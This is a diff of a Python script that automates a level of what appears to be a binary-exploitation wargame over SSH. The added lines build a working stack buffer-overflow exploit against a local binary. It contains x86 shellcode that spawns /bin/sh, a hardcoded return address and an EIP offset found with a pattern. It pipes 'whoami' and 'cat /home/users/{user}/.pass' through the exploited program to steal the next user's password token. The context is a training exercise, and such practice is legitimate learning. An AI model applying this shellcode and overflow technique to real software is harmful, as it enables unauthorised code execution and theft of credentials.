@@ -2,9 +2,9 @@ import os
 import sys
 
 bool('Ressources' in os.getcwd()) if sys.path.append("../") else sys.path.append("../..")
-from utils.ssh import exec, connect, exec_in_stream, exec_stream, connect_by_previous, find_offset, get_func_address
+from utils.ssh import exec, connect_by_previous, find_offset
 from utils.text import print_output, print_title, print_magic
-from utils.base import save_token, address_to_decimal, PATTERN, address_to_string
+from utils.base import save_token
 
 client = connect_by_previous()
 
@@ -77,45 +77,24 @@ print_magic('Overflow time!!!!!!!!!!!!!!')
 print_title('Find EIP offset, to overflow buffer and execute any binary')
 offset = find_offset(client, register='eip', stdin=True, command_after_pattern='(echo "dat_wil"; cat -)')
 
+system_call_sh = '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80'
+rewrite_address = '\\x47\\xa0\\x04\\x08'
+shell_code = f"""(python -c "print 'dat_wil' + '{system_call_sh}' + '\\n' + '.' * {offset} + '{rewrite_address}'"; cat)"""
+f = lambda command: f'echo "{command}" | {shell_code} | ./{binary_name}'
 
-shell_code = f'perl -e \'print "dat_wil" . "\\x6a\\x0b\\x58\\x99\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xcd\\x80" . "\\n" . "." x {offset} . "\\x47\\xa0\\x04\\x08"\''
-f = lambda command: f'(echo `{shell_code}`;cat -) | ./{binary_name}'
+print_title('Prepare some data')
+print_title(f'System call bin/sh is - {system_call_sh}')
+print_title(f'Address to rewrite after buffer overflow - {rewrite_address}')
 
-
-output = exec(client, f('whoami'), title='Check user')
+output = exec(client, f('whoami'), title='Try to overflow buffer, rewrite stack and call whoami command')
 print_output(output)
+print_title('Level02, yeah, what we need exactly')
+print_title('Time to dirty tricks')
+user = output[0]
 
-# password = str(address_to_decimal(0x149c))
-# print_title(f'Our password is {password}?')
-# print_title('Gotcha! Try this!')
-#
-# output = exec(
-#     client,
-#     f'echo "\n" | (echo {password}; cat -) | ./{binary_name}',
-#     title='Execute binary again with obtained password'
-# )
-# print_output(output)
-# print_title('Access granted, done')
-# print_title('Check which user in use at now')
-#
-# output = exec(
-#     client,
-#     f'echo "whoami" | (echo {password}; cat -) | ./{binary_name}',
-#     title='Execute binary again with obtained password'
-# )
-# user = output[0]
-# print_output(user)
-# print_title("Level01 - it's what we need, right?")
-#
-# output = exec(
-#     client,
-#     f'echo "cat /home/users/{user}/.pass" | (echo {password}; cat -) | ./{binary_name}',
-#     title='Steal password'
-# )
-# token = output[0]
-# print_output(token)
-# print_title('Woo-hoo!')
-#
-# save_token(token, client)
-#
-#
+output = exec(client, f(f'cat /home/users/{user}/.pass'), title='Steal password')
+print_output(output)
+print_title('Gotcha!')
+token = output[0]
+
+save_token(token, client)
